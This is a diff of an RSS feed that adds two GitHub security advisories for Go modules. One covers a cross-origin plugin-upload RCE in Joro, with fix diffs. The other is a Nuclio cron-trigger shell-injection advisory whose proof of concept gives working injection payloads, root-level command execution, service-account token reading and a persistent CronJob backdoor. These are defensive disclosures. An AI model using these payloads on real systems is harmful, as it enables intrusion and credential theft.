@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-07-08T19:04:33.501Z</updated>
+    <updated>2026-07-08T20:54:58.639Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,1152 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/BishopFox/joro] Joro: Unauthenticated Cross-Origin Plugin Upload Leads to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-xqhv-chqm-fhcc</id>
+        <link href="https://github.com/advisories/GHSA-xqhv-chqm-fhcc"/>
+        <updated>2026-07-08T20:27:04.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="unauthenticated-cross-origin-plugin-upload-leads-to-rce-joro-≤-v110">Unauthenticated Cross-Origin Plugin Upload Leads to RCE (Joro ≤ v1.1.0)</h1>
+<p><strong>Severity:</strong> Critical
+<strong>CVSS v3.1:</strong> 9.6 (AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H)
+<strong>Affected versions:</strong> Joro ≤ v1.1.0, proxy mode (default), Linux/macOS
+<strong>Reporter:</strong> cstover
+<strong>Date:</strong> 2026-05-27</p>
+<hr>
+<h2 id="summary">Summary</h2>
+<p>Joro's default proxy mode (in versions &lt;= 1.1.0) exposes a local API on <code>127.0.0.1:9090</code> that performs no authentication and applies a wildcard CORS policy. Because plugin uploads use the CORS-safelisted <code>multipart/form-data</code> content type, cross-origin JavaScript on any page the operator visits can reach privileged endpoints - including uploading a native plugin and triggering a restart - directly through the operator's browser, with no preflight or credentials. Since plugins execute on load, this yields unauthenticated remote code execution as the operator's user from a single page visit.</p>
+<hr>
+<h2 id="root-cause">Root Cause</h2>
+<p>Three weaknesses combined into the exploit chain.</p>
+<p><strong>1. No authentication in proxy mode.</strong>
+<code>internal/api/server.go</code> applied <code>AuthMiddleware</code> only when <code>listenerMode</code> was <code>true</code>. In the default proxy mode every API endpoint — including plugin upload and system restart — accepted requests without any token, cookie, or credential.</p>
+<p><strong>2. Permissive CORS with an insufficient protection assumption.</strong>
+<code>corsMiddleware</code> set <code>Access-Control-Allow-Origin: *</code> unconditionally on all responses. <code>SECURITY.md</code> documented this as an intentional tradeoff on the basis that proxy mode binds to <code>127.0.0.1</code>, which the document states "limits exposure to the local machine."</p>
+<p>That assumption was incorrect. <code>multipart/form-data</code> is a CORS-safelisted <code>Content-Type</code>, so cross-origin JavaScript can POST files to the Joro API without triggering a preflight request — the browser allows it. Any web page the operator visited reached the localhost API through their browser without restriction. The localhost bind provided no protection against browser-mediated requests.</p>
+<p><strong>3. Plugin <code>init()</code> executed on <code>plugin.Open()</code> before symbol lookup.</strong>
+<code>internal/plugins/loader.go</code> called <code>plugin.Open()</code>, which ran the plugin's <code>init()</code> functions before any symbol lookup occurred. A plugin with no exports still executed its payload the moment Joro restarted.</p>
+<hr>
+<h2 id="attack-chain">Attack Chain</h2>
+<ol>
+<li>The operator visits an attacker-controlled page in Firefox on their machine.</li>
+<li>JavaScript on the page fetches <code>pwn.so</code> from the attacker's server (same-origin, no CORS issue).</li>
+<li>JavaScript POSTs <code>pwn.so</code> to <code>http://127.0.0.1:9090/api/v1/plugins/upload</code> as <code>multipart/form-data</code>. Joro accepts it — no auth, no preflight.</li>
+<li>JavaScript POSTs to <code>http://127.0.0.1:9090/api/v1/system/restart</code>. Joro re-executes.</li>
+<li>On restart, <code>plugin.Open("pwn.so")</code> calls <code>init()</code>, which opens a goroutine and dials back to the attacker's listener.</li>
+<li>An interactive <code>/bin/bash -i</code> shell is obtained as the operator's user.</li>
+</ol>
+<p>The plugin ABI matches without any access to the operator's machine. The same public v1.1.0 release tarball is downloaded and Joro's own <code>--build-plugin</code> feature is used, which reads <code>runtime/debug.BuildInfo</code> from the release binary and forwards every ABI-relevant flag. One <code>.so</code> works against every operator running that release.</p>
+<hr>
+<h2 id="impact">Impact</h2>
+<p>Unauthenticated, remote, browser-mediated code execution as the operator's user. Because the exploit pivots through the operator's browser to the loopback-bound API, the network bind offers no protection, and a single ABI-matched plugin works against every operator running the affected release.</p>
+<h2 id="fix">Fix</h2>
+<p>The chain is broken at multiple layers. Cross-origin browser access to the proxy-mode API is eliminated, the API is restricted to same-origin requests targeting a loopback host, and the UI/API is bound to loopback only.</p>
+<h3 id="1-removed-the-wildcard-cors-header-and-gated-the-proxy-mode-api-behind-a-same-origin-guard">1. Removed the wildcard CORS header and gated the proxy-mode API behind a same-origin guard</h3>
+<p><code>corsMiddleware</code> (which set <code>Access-Control-Allow-Origin: *</code> on every response) was deleted, and proxy mode now wraps the API in <code>originGuard</code> instead. (<code>internal/api/server.go</code>, commit <code>5c0ca35</code>)</p>
+<pre><code class="language-diff"> var handler http.Handler = mux
+ if s.listenerMode {
++     // Listener/teamserver: bearer-token auth.
+      handler = team.AuthMiddleware(s.teamToken, handler)
++} else {
++     // Proxy mode: restrict the API to same-origin browser requests.
++     handler = originGuard(uiBind, handler)
+ }
+-handler = corsMiddleware(handler)
+</code></pre>
+<pre><code class="language-diff">-// corsMiddleware adds permissive CORS headers for dev usage.
+-func corsMiddleware(next http.Handler) http.Handler {
+-     return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+-             w.Header().Set("Access-Control-Allow-Origin", "*")
+-             w.Header().Set("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS")
+-             w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Joro-Nickname")
+-             if r.Method == http.MethodOptions {
+-                     w.WriteHeader(http.StatusNoContent)
+-                     return
+-             }
+-             next.ServeHTTP(w, r)
+-     })
+-}
+</code></pre>
+<h3 id="2-same-origin-enforcement-via-sec-fetch-site--originhost">2. Same-origin enforcement via <code>Sec-Fetch-Site</code> + <code>Origin</code>/<code>Host</code></h3>
+<p><code>originGuard</code> rejects state-changing requests (and the <code>/ws</code> upgrade) whose <code>Sec-Fetch-Site</code> indicates a cross-origin initiator or whose <code>Origin</code> host does not match the request <code>Host</code>. Non-browser local tooling (no browser headers) is still allowed. (<code>internal/api/originguard.go</code>, commit <code>5c0ca35</code>)</p>
+<pre><code class="language-go">func isMutating(method string) bool {
+      switch method {
+      case http.MethodPost, http.MethodPut, http.MethodDelete, http.MethodPatch:
+              return true
+      default:
+              return false
+      }
+}
+
+func sameOrigin(r *http.Request) bool {
+      switch r.Header.Get("Sec-Fetch-Site") {
+      case "", "same-origin", "none":
+              // Same-origin, a direct navigation, or a non-browser client.
+      default: // "cross-site", "same-site"
+              return false
+      }
+      if origin := r.Header.Get("Origin"); origin != "" {
+              if origin == "null" {
+                      return false // opaque/sandboxed cross-origin context
+              }
+              u, err := url.Parse(origin)
+              if err != nil || !strings.EqualFold(reqHostname(u.Host), reqHostname(r.Host)) {
+                      return false
+              }
+      }
+      return true
+}
+</code></pre>
+<h3 id="3-tightened-the-websocket-origin-check">3. Tightened the WebSocket origin check</h3>
+<p>The WebSocket upgrader previously accepted every origin (<code>CheckOrigin: return true</code>). It now rejects cross-origin handshakes while still permitting non-browser clients. (<code>internal/api/ws.go</code>, commit <code>5c0ca35</code>)</p>
+<pre><code class="language-diff">var upgrader = websocket.Upgrader{
+-     CheckOrigin: func(r *http.Request) bool { return true },
++     CheckOrigin: func(r *http.Request) bool {
++             origin := r.Header.Get("Origin")
++             if origin == "" {
++                     return true
++             }
++             if origin == "null" {
++                     return false
++             }
++             u, err := url.Parse(origin)
++             if err != nil {
++                     return false
++             }
++             return strings.EqualFold(reqHostname(u.Host), reqHostname(r.Host))
++     },
+ }
+</code></pre>
+<h3 id="4-bound-the-proxy-mode-uiapi-to-loopback-and-removed-the-wildcard-host-exception">4. Bound the proxy-mode UI/API to loopback and removed the wildcard host exception</h3>
+<p>The same-origin check alone can be defeated by DNS rebinding under a wildcard bind, because a rebound host (e.g. <code>attacker.com</code>) carries consistent <code>Origin</code>/<code>Host</code>/<code>Sec-Fetch-Site</code> headers. Two coordinated changes close this: the proxy-mode UI/API now binds to <code>127.0.0.1</code> regardless of <code>--bind</code> (which governs only the proxy port), and <code>hostAllowed</code> no longer has a wildcard exception, so the host must be loopback or the exact bind address. (<code>internal/api/server.go</code> and <code>internal/api/originguard.go</code>, commit <code>871936f</code>)</p>
+<pre><code class="language-diff">+// In proxy mode the UI/API binds to loopback only: --bind governs the proxy
++// port, and remote collaboration is listener/teamserver mode (bearer-token auth).
++uiBind := s.cfg.BindAddr
++if !s.listenerMode {
++     uiBind = "127.0.0.1"
++}
++
+ var handler http.Handler = mux
+ ...
+ s.srv = &amp;http.Server{
+-     Addr:              fmt.Sprintf("%s:%d", s.cfg.BindAddr, s.cfg.UIPort),
++     Addr:              fmt.Sprintf("%s:%d", uiBind, s.cfg.UIPort),
+</code></pre>
+<pre><code class="language-diff"> func hostAllowed(reqHost, bindAddr string) bool {
+      h := reqHostname(reqHost)
+      if h == "" {
+              return false
+      }
+      switch h {
+      case "localhost", "127.0.0.1", "::1":
+              return true
+      }
+-     switch bindAddr {
+-     case "", "0.0.0.0", "::":
+-             return true
+-     }
+      return strings.EqualFold(h, reqHostname(bindAddr))
+ }
+</code></pre>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/BishopFox/joro/security/advisories/GHSA-xqhv-chqm-fhcc">https://github.com/BishopFox/joro/security/advisories/GHSA-xqhv-chqm-fhcc</a></li>
+<li><a href="https://github.com/advisories/GHSA-xqhv-chqm-fhcc">https://github.com/advisories/GHSA-xqhv-chqm-fhcc</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-xqhv-chqm-fhcc</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-07-08T20:27:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/nuclio/nuclio] Nuclio: Unsanitized cron trigger event headers/body injected into CronJob shell command leads to persistent RCE]]></title>
+        <id>https://github.com/advisories/GHSA-v5px-423j-pf7p</id>
+        <link href="https://github.com/advisories/GHSA-v5px-423j-pf7p"/>
+        <updated>2026-07-08T20:24:21.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>Nuclio controller builds a <code>curl</code> invocation string for each cron trigger and stores it as the <code>args</code> of a Kubernetes CronJob container (<code>/bin/sh</code>, <code>-c</code>, <code>&lt;command&gt;</code>). Two fields in the trigger specification flow into this string without adequate sanitization:</p>
+<ul>
+<li><code>event.headers</code> keys — interpolated verbatim inside double-quoted <code>--header</code> arguments (<code>lazy.go:2150</code>); any key containing <code>"</code> breaks the quoting context.</li>
+<li><code>event.body</code> — processed with <code>strconv.Quote</code>, which escapes <code>"</code> and <code>\</code> but not <code>$()</code>, allowing command substitution (<code>lazy.go:2188</code>).</li>
+</ul>
+<p>Both paths were dynamically verified on Nuclio 1.15.27 (latest as of 2026-05-17).</p>
+<ul>
+<li><strong>CVSS 3.1</strong>: <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</code> — <strong>9.9 (Critical)</strong></li>
+<li><strong>CWE</strong>: CWE-78 (Improper Neutralization of Special Elements used in an OS Command)</li>
+<li><strong>Affected versions</strong>: Nuclio &lt;= 1.15.27 (latest, dynamically verified)</li>
+</ul>
+<hr>
+<h2 id="details">Details</h2>
+<h3 id="root-cause">Root Cause</h3>
+<p>When a NuclioFunction with a <code>cron</code> trigger is reconciled by the controller, it calls <code>generateCronTriggerCronJobSpec</code> in <code>pkg/platform/kube/functionres/lazy.go:2113</code>. This function builds a shell command string by concatenating user-supplied values and passes it directly to <code>/bin/sh -c</code>.</p>
+<p><strong>Path-A — Header key injection (<code>lazy.go:2146-2151</code>)</strong></p>
+<pre><code class="language-go">// lazy.go:2146-2151
+headersAsCurlArg := ""
+for headerKey := range attributes.Event.Headers {
+    headerValue := attributes.Event.GetHeaderString(headerKey)
+    headersAsCurlArg = fmt.Sprintf("%s --header \"%s: %s\"",
+        headersAsCurlArg, headerKey, headerValue)
+    //                              ↑
+    //                   headerKey is user-controlled; no escaping applied
+}
+</code></pre>
+<p><code>headerKey</code> is taken from <code>event.headers</code> in the trigger specification. Since it is interpolated directly inside a double-quoted shell argument, a key containing <code>"</code> terminates the quoting context. The remainder of the key is then interpreted as raw shell syntax.</p>
+<p>Attack string for <code>headerKey</code>:</p>
+<pre><code>X-Inject"; ARBITRARY_COMMAND; echo "
+</code></pre>
+<p>Resulting shell command fragment:</p>
+<pre><code class="language-bash">--header "X-Inject"; ARBITRARY_COMMAND; echo ": value"
+</code></pre>
+<p><strong>Path-B — Body command substitution (<code>lazy.go:2173-2192</code>)</strong></p>
+<pre><code class="language-go">// lazy.go:2188-2192
+curlCommand = fmt.Sprintf("echo %s &gt; %s &amp;&amp; %s %s",
+    strconv.Quote(eventBody),   // escapes " → \" and \ → \\, but NOT $()
+    eventBodyFilePath,
+    curlCommand,
+    eventBodyCurlArg)
+</code></pre>
+<p><code>strconv.Quote</code> wraps the string in double quotes and escapes <code>"</code> and <code>\</code>, but does not escape <code>$</code>, <code>(</code>, or <code>)</code>. A body value of <code>$(CMD)</code> becomes the Go string <code>"$(CMD)"</code>, which the shell expands as command substitution when executing the <code>/bin/sh -c</code> string.</p>
+<p>Attack string for <code>event.body</code>:</p>
+<pre><code>$(ARBITRARY_COMMAND)
+</code></pre>
+<p>Resulting shell command:</p>
+<pre><code class="language-bash">echo "$(ARBITRARY_COMMAND)" &gt; /tmp/eventbody.out &amp;&amp; curl ...
+</code></pre>
+<p><strong>Execution sink (<code>lazy.go:2212</code>)</strong></p>
+<pre><code class="language-go">// lazy.go:2212
+Args: []string{"/bin/sh", "-c", curlCommand}
+</code></pre>
+<p>The entire concatenated string — including any injected content — is executed by the shell.</p>
+<p><strong>Persistence mechanism</strong></p>
+<p>The CronJob created by the controller carries no <code>ownerReferences</code> linking it to the NuclioFunction. Kubernetes cascade deletion only applies to owned resources. If the controller crashes between function deletion and explicit CronJob deletion, the CronJob continues executing on its schedule indefinitely. The controller code itself acknowledges this at <code>lazy.go:522</code>:</p>
+<pre><code class="language-go">// Delete function k8s CronJobs before the Deployment so they cannot spawn new
+// CronJobs are not owned by the Deployment, so cascade does not remove them.
+</code></pre>
+<hr>
+<h2 id="poc">PoC</h2>
+<h3 id="environment-setup">Environment Setup</h3>
+<p>The following steps reproduce the vulnerability in an isolated local environment.</p>
+<p><strong>Step 1 — Install prerequisites</strong></p>
+<pre><code class="language-bash"># kind (Kubernetes-in-Docker)
+curl -Lo /usr/local/bin/kind \
+    https://kind.sigs.k8s.io/dl/v0.22.0/kind-linux-amd64
+chmod +x /usr/local/bin/kind
+
+# Helm
+curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
+</code></pre>
+<p><strong>Step 2 — Create isolated kind cluster</strong></p>
+<pre><code class="language-bash">kind create cluster --name vul-010
+kubectl cluster-info --context kind-vul-010
+</code></pre>
+<p>Expected output:</p>
+<pre><code>Kubernetes control plane is running at https://127.0.0.1:xxxxx
+</code></pre>
+<p><strong>Step 3 — Deploy Nuclio (latest 1.15.27)</strong></p>
+<pre><code class="language-bash">helm repo add nuclio https://nuclio.github.io/nuclio/charts
+helm repo update
+
+kubectl create namespace nuclio
+
+helm install nuclio nuclio/nuclio \
+    --namespace nuclio \
+    --kube-context kind-vul-010 \
+    --version 0.21.27 \
+    --set dashboard.enabled=true \
+    --set controller.enabled=true
+</code></pre>
+<p>Wait for the controller to become ready:</p>
+<pre><code class="language-bash">kubectl wait --for=condition=Available deployment/nuclio-controller \
+    -n nuclio --context kind-vul-010 --timeout=120s
+</code></pre>
+<p><strong>Step 4 — Create a NuclioProject</strong></p>
+<pre><code class="language-bash">kubectl apply --context kind-vul-010 -f - &lt;&lt;'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioProject
+metadata:
+  name: default
+  namespace: nuclio
+spec:
+  description: "default project"
+EOF
+</code></pre>
+<p><strong>Step 5 — Prepare a placeholder image for the function deployment</strong></p>
+<p>The controller needs a non-empty image field to create the function Deployment. Load any small image that is already present on the host:</p>
+<pre><code class="language-bash"># Tag alpine as the placeholder function image
+docker tag gcr.io/iguazio/alpine:3.20 placeholder-function:latest
+kind load docker-image placeholder-function:latest --name vul-010
+
+# Also load the CronJob runner image (appropriate/curl or any sh-capable image)
+docker tag gcr.io/iguazio/alpine:3.20 appropriate/curl:latest
+kind load docker-image appropriate/curl:latest --name vul-010
+</code></pre>
+<hr>
+<h3 id="exploitation--path-a-header-key-injection">Exploitation — Path-A: Header Key Injection</h3>
+<p><strong>Step 6 — Create a NuclioFunction with malicious header key</strong></p>
+<p>The injection payload in the header key is:</p>
+<pre><code>X-Inject"; echo "===RCE_CONFIRMED==="; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo "
+</code></pre>
+<pre><code class="language-bash">kubectl apply --context kind-vul-010 -f - &lt;&lt;'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioFunction
+metadata:
+  name: vul010-rce-visible
+  namespace: nuclio
+  labels:
+    nuclio.io/project-name: default
+spec:
+  image: placeholder-function:latest
+  runtime: python:3.9
+  handler: main:handler
+  build:
+    functionSourceCode: "ZGVmIGhhbmRsZXIoY29udGV4dCwgZXZlbnQpOgogICAgcmV0dXJuICdoZWxsbyc="
+  triggers:
+    cron-inject:
+      kind: cron
+      attributes:
+        schedule: "*/1 * * * *"
+        event:
+          headers:
+            X-Normal: safe-value
+            'X-Inject"; echo "===RCE_CONFIRMED==="; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo "': marker
+  minReplicas: 1
+  maxReplicas: 1
+EOF
+</code></pre>
+<p><strong>Step 7 — Trigger the controller to create the CronJob</strong></p>
+<pre><code class="language-bash">kubectl patch nucliofunction vul010-rce-visible -n nuclio \
+    --context kind-vul-010 \
+    --type=merge \
+    -p '{"status":{"state":"waitingForResourceConfiguration"}}'
+</code></pre>
+<p>Wait ~10 seconds for the controller to reconcile, then list CronJobs:</p>
+<pre><code class="language-bash">kubectl get cronjob -n nuclio --context kind-vul-010
+</code></pre>
+<p>Expected output:</p>
+<pre><code>NAME                                   SCHEDULE      SUSPEND   ACTIVE   LAST SCHEDULE   AGE
+nuclio-cron-job-d84tg6lmuaqc73arn15g   */1 * * * *   False     0        &lt;none&gt;          12s
+</code></pre>
+<p><strong>Step 8 — Inspect the generated CronJob command (static confirmation)</strong></p>
+<pre><code class="language-bash">CJ_NAME=$(kubectl get cronjob -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.items[0].metadata.name}')
+
+kubectl get cronjob "$CJ_NAME" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.spec.jobTemplate.spec.template.spec.containers[0].args}' \
+    | python3 -m json.tool
+</code></pre>
+<p>Actual output from verification:</p>
+<pre><code class="language-json">[
+    "/bin/sh",
+    "-c",
+    "curl --silent  --header \"X-Inject\"; echo \"===RCE_CONFIRMED===\"; id; cat /var/run/secrets/kubernetes.io/serviceaccount/token | head -c 50; echo \": marker\" --header \"X-Normal: safe-value\" --header \"X-Nuclio-Invoke-Trigger: cron\" --header \"X-Nuclio-Target: vul010-rce-visible\" nuclio-vul010-rce-visible.nuclio.svc.cluster.local:8080 --retry 10 --retry-delay 1 --retry-max-time 10 --retry-connrefused"
+]
+</code></pre>
+<p>The injected commands are clearly embedded between the shell-separated statements.</p>
+<p><strong>Step 9 — Manually trigger a CronJob run (dynamic confirmation)</strong></p>
+<pre><code class="language-bash">kubectl create job --from=cronjob/"$CJ_NAME" \
+    vul010-rce-proof -n nuclio --context kind-vul-010
+
+# Wait for the pod to complete
+kubectl wait pod -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-rce-proof \
+    --for=condition=Ready --timeout=30s 2&gt;/dev/null || true
+
+POD=$(kubectl get pods -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-rce-proof -o jsonpath='{.items[0].metadata.name}')
+
+kubectl logs "$POD" -n nuclio --context kind-vul-010
+</code></pre>
+<p>Actual pod log output from verification:</p>
+<pre><code>/bin/sh: curl: not found
+===RCE_CONFIRMED===
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+eyJhbGciOiJSUzI1NiIsImtpZCI6InNtaUE1WS0yVXl2ZUhsTG: marker --header X-Normal: safe-value ...
+</code></pre>
+<ul>
+<li>Line 1: <code>curl</code> exits immediately at <code>"X-Inject"</code> (no curl binary in alpine)</li>
+<li>Line 2: <code>echo "===RCE_CONFIRMED==="</code> executes — injection confirmed</li>
+<li>Line 3: <code>id</code> executes — container runs as <code>uid=0 (root)</code></li>
+<li>Line 4: <code>cat .../token | head -c 50</code> exfiltrates the first 50 bytes of the K8s SA token</li>
+</ul>
+<hr>
+<h3 id="exploitation--path-b-body-command-substitution">Exploitation — Path-B: Body Command Substitution</h3>
+<p><strong>Step 10 — Create a NuclioFunction with malicious event body</strong></p>
+<pre><code class="language-bash">kubectl apply --context kind-vul-010 -f - &lt;&lt;'EOF'
+apiVersion: nuclio.io/v1beta1
+kind: NuclioFunction
+metadata:
+  name: vul010-body-inject
+  namespace: nuclio
+  labels:
+    nuclio.io/project-name: default
+spec:
+  image: placeholder-function:latest
+  runtime: python:3.9
+  handler: main:handler
+  build:
+    functionSourceCode: "ZGVmIGhhbmRsZXIoY29udGV4dCwgZXZlbnQpOgogICAgcmV0dXJuICdoZWxsbyc="
+  triggers:
+    cron-body:
+      kind: cron
+      attributes:
+        schedule: "*/1 * * * *"
+        event:
+          body: "$(id 1&gt;&amp;2; echo BODY_INJECTION_PROOF)"
+  minReplicas: 1
+  maxReplicas: 1
+EOF
+
+kubectl patch nucliofunction vul010-body-inject -n nuclio \
+    --context kind-vul-010 \
+    --type=merge \
+    -p '{"status":{"state":"waitingForResourceConfiguration"}}'
+</code></pre>
+<p><strong>Step 11 — Verify CronJob command (static)</strong></p>
+<pre><code class="language-bash">sleep 15
+CJ_NAME_B=$(kubectl get cronjob -n nuclio --context kind-vul-010 \
+    -l "nuclio.io/function-name=vul010-body-inject" \
+    -o jsonpath='{.items[0].metadata.name}')
+
+kubectl get cronjob "$CJ_NAME_B" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.spec.jobTemplate.spec.template.spec.containers[0].args}' \
+    | python3 -m json.tool
+</code></pre>
+<p>Actual output from verification:</p>
+<pre><code class="language-json">[
+    "/bin/sh",
+    "-c",
+    "echo \"$(id 1&gt;&amp;2; echo BODY_INJECTION_PROOF)\" &gt; /tmp/eventbody.out &amp;&amp; curl --silent  --header \"X-Nuclio-Invoke-Trigger: cron\" --header \"X-Nuclio-Target: vul010-body-inject\" nuclio-vul010-body-inject.nuclio.svc.cluster.local:8080 ..."
+]
+</code></pre>
+<p><code>$()</code> is present unescaped inside a double-quoted string passed to <code>/bin/sh -c</code>.</p>
+<p><strong>Step 12 — Dynamic execution</strong></p>
+<pre><code class="language-bash">kubectl create job --from=cronjob/"$CJ_NAME_B" \
+    vul010-body-proof -n nuclio --context kind-vul-010
+
+POD_B=$(kubectl get pods -n nuclio --context kind-vul-010 \
+    -l job-name=vul010-body-proof -o jsonpath='{.items[0].metadata.name}')
+
+kubectl logs "$POD_B" -n nuclio --context kind-vul-010
+</code></pre>
+<p>Actual pod log output from verification:</p>
+<pre><code>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+/bin/sh: curl: not found
+</code></pre>
+<p><code>id</code> ran as root via <code>$()</code> expansion before <code>curl</code> was even attempted.</p>
+<hr>
+<h3 id="persistence-verification">Persistence Verification</h3>
+<p><strong>Step 13 — Confirm CronJob has no ownerReferences</strong></p>
+<pre><code class="language-bash">kubectl get cronjob "$CJ_NAME" -n nuclio --context kind-vul-010 \
+    -o jsonpath='{.metadata.ownerReferences}'
+</code></pre>
+<p>Expected: empty (no output)</p>
+<p><strong>Step 14 — Simulate controller crash during function deletion</strong></p>
+<pre><code class="language-bash"># Stop the controller
+kubectl scale deployment nuclio-controller -n nuclio \
+    --context kind-vul-010 --replicas=0
+
+# Delete the function
+kubectl delete nucliofunction vul010-rce-visible -n nuclio \
+    --context kind-vul-010
+
+sleep 5
+
+# Function is gone — CronJob remains
+kubectl get nucliofunction -n nuclio --context kind-vul-010
+kubectl get cronjob -n nuclio --context kind-vul-010
+</code></pre>
+<p>Actual output from verification:</p>
+<pre><code># NuclioFunctions:
+NAME                  AGE
+vul010-body-inject2   2m30s
+(vul010-rce-visible deleted — not listed)
+
+# CronJobs:
+NAME                                   SCHEDULE      SUSPEND   ACTIVE
+nuclio-cron-job-d84tj8lmuaqc73arn170   */1 * * * *   False     0
+(CronJob belonging to the deleted function — still running)
+</code></pre>
+<p><strong>Step 15 — Execute the persistent backdoor</strong></p>
+<pre><code class="language-bash">kubectl create job --from=cronjob/nuclio-cron-job-d84tj8lmuaqc73arn170 \
+    vul010-persist-backdoor -n nuclio --context kind-vul-010
+
+kubectl logs vul010-persist-backdoor-* -n nuclio --context kind-vul-010
+</code></pre>
+<p>Actual pod log output from verification:</p>
+<pre><code>/bin/sh: curl: not found
+PERSISTENT_BACKDOOR_ACTIVE
+: attacker-value --header X-Nuclio-Invoke-Trigger: cron --header X-Nuclio-Target: vul010-persist-test ...
+</code></pre>
+<p>The injected command executes after the source function has been deleted.</p>
+<hr>
+<h3 id="cleanup">Cleanup</h3>
+<pre><code class="language-bash">kubectl delete nucliofunction --all -n nuclio --context kind-vul-010 2&gt;/dev/null
+kubectl delete cronjob --all -n nuclio --context kind-vul-010 2&gt;/dev/null
+kind delete cluster --name vul-010
+</code></pre>
+<hr>
+<h2 id="impact">Impact</h2>
+<p><strong>Remote Code Execution</strong>: An attacker with network access to the Dashboard API (unauthenticated by default) can execute arbitrary shell commands inside the CronJob pod on every scheduled tick.</p>
+<p><strong>Runs as root</strong>: Every CronJob pod confirmed running as <code>uid=0(root)</code> during verification.</p>
+<p><strong>ServiceAccount token exfiltration</strong>: The pod's mounted SA token (<code>/var/run/secrets/ kubernetes.io/serviceaccount/token</code>) is readable by the injected commands and can be exfiltrated to an attacker-controlled host via the injected <code>curl</code> call. This token enables:</p>
+<ul>
+<li>Enumeration of Kubernetes API resources in the <code>nuclio</code> namespace</li>
+<li>In misconfigured clusters, cluster-wide API access</li>
+</ul>
+<p><strong>Persistent backdoor</strong>: The CronJob resource has no <code>ownerReferences</code> and is not garbage-collected by Kubernetes. In the window between controller unavailability and explicit cleanup, the CronJob continues executing the attacker's commands on the configured schedule (minimum every 1 minute) — persisting beyond function deletion, Nuclio redeployments, or loss of attacker Dashboard access.</p>
+<p><strong>Cloud environment lateral movement</strong>: In managed Kubernetes environments (AWS EKS, GCP GKE, Azure AKS), the injected commands can access the cloud instance metadata service to retrieve IAM credentials, enabling lateral movement outside the cluster.</p>
+<hr>
+<h2 id="severity">Severity</h2>
+<p><strong>Critical — CVSS 3.1 Score: 9.9</strong></p>
+<pre><code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Metric</th>
+<th>Value</th>
+<th>Rationale</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Attack Vector</td>
+<td>Network</td>
+<td>Dashboard is network-accessible</td>
+</tr>
+<tr>
+<td>Attack Complexity</td>
+<td>Low</td>
+<td>No preconditions; straightforward payload</td>
+</tr>
+<tr>
+<td>Privileges Required</td>
+<td>None</td>
+<td>NOP auth is the default configuration</td>
+</tr>
+<tr>
+<td>User Interaction</td>
+<td>None</td>
+<td>Fully automated via API</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Changed</td>
+<td>Impact crosses pod boundary into cluster</td>
+</tr>
+<tr>
+<td>Confidentiality</td>
+<td>High</td>
+<td>SA token, secrets readable</td>
+</tr>
+<tr>
+<td>Integrity</td>
+<td>High</td>
+<td>Arbitrary command execution as root</td>
+</tr>
+<tr>
+<td>Availability</td>
+<td>High</td>
+<td>Persistent CronJob can exhaust cluster resources</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="affected-versions">Affected Versions</h2>
+<p>All Nuclio versions that support Kubernetes CronJob-based cron triggers, which includes the current production release.</p>
+<ul>
+<li><strong>Confirmed affected</strong>: 1.15.27 (latest as of 2026-05-17, dynamically verified)</li>
+<li><strong>Earliest affected</strong>: introduced when CronJob-based cron trigger support was added (cronTriggerCreationMode: kube)</li>
+</ul>
+<hr>
+<h2 id="patched-versions">Patched Versions</h2>
+<p><a href="https://github.com/nuclio/nuclio/releases/tag/1.16.4">https://github.com/nuclio/nuclio/releases/tag/1.16.4</a></p>
+<hr>
+<h2 id="workarounds">Workarounds</h2>
+<ol>
+<li><p><strong>Network-level restriction</strong>: Place the Nuclio Dashboard behind an authenticated
+reverse proxy or restrict port 8070 to trusted networks only. This limits who can
+submit function specifications.</p>
+</li>
+<li><p><strong>Disable cron triggers</strong>: If cron trigger functionality is not required, avoid creating
+functions with <code>kind: cron</code> triggers.</p>
+</li>
+<li><p><strong>RBAC restriction</strong>: Remove the <code>batch</code> API group permission from the Nuclio controller
+ServiceAccount to prevent CronJob creation. Note: this disables cron trigger
+functionality entirely.</p>
+</li>
+</ol>
+<p>None of the above eliminate the root cause; they only reduce exposure.</p>
